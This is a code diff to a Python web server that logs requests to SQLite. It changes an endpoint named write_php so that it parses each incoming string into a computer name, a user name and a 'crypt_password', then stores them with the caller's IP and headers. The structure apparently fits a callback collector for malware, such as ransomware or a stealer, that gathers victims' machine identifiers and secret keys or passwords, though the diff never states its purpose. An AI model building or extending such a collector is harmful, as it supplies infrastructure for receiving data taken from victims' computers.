@@ -26,12 +26,17 @@ def init_db():
     """Initialize the database with the logs table."""
     conn = sqlite3.connect(DB_FILE)
     c = conn.cursor()
+    # Create table with new schema if it doesn't exist
     c.execute('''CREATE TABLE IF NOT EXISTS logs
                  (id INTEGER PRIMARY KEY AUTOINCREMENT,
                   ip TEXT,
                   info TEXT,
+                  computer_name TEXT,
+                  user_name TEXT,
+                  crypt_password TEXT,
                   headers TEXT,
                   timestamp DATETIME DEFAULT CURRENT_TIMESTAMP)''')
+
     conn.commit()
     conn.close()
 
@@ -60,9 +65,36 @@ async def write_php(info: str, request: Request):
     ip = request.client.host if request.client else "Unknown"
     headers = str(request.headers)
     
+    # Parse info string: "ComputerName-UserName Password"
+    computer_name = "Unknown"
+    user_name = "Unknown"
+    crypt_password = "Unknown"
+    
+    try:
+        # Check if space exists for password separation
+        if " " in info:
+            remainder, crypt_password = info.rsplit(" ", 1)
+            
+            # Split ComputerName and UserName by the last dash
+            # Heuristic: Computer names often have dashes, usernames rarely do.
+            if "-" in remainder:
+                 computer_name, user_name = remainder.rsplit("-", 1)
+            else:
+                 computer_name = remainder
+        else:
+            # Fallback if no space found
+            if "-" in info:
+                 computer_name, user_name = info.rsplit("-", 1)
+            else:
+                 computer_name = info
+                 
+    except Exception as e:
+        logging.error(f"Error parsing info: {e}")
+
     conn = sqlite3.connect(DB_FILE)
     c = conn.cursor()
-    c.execute("INSERT INTO logs (ip, info, headers) VALUES (?, ?, ?)", (ip, info, headers))
+    c.execute("INSERT INTO logs (ip, info, computer_name, user_name, crypt_password, headers) VALUES (?, ?, ?, ?, ?, ?)", 
+              (ip, info, computer_name, user_name, crypt_password, headers))
     conn.commit()
     conn.close()
 
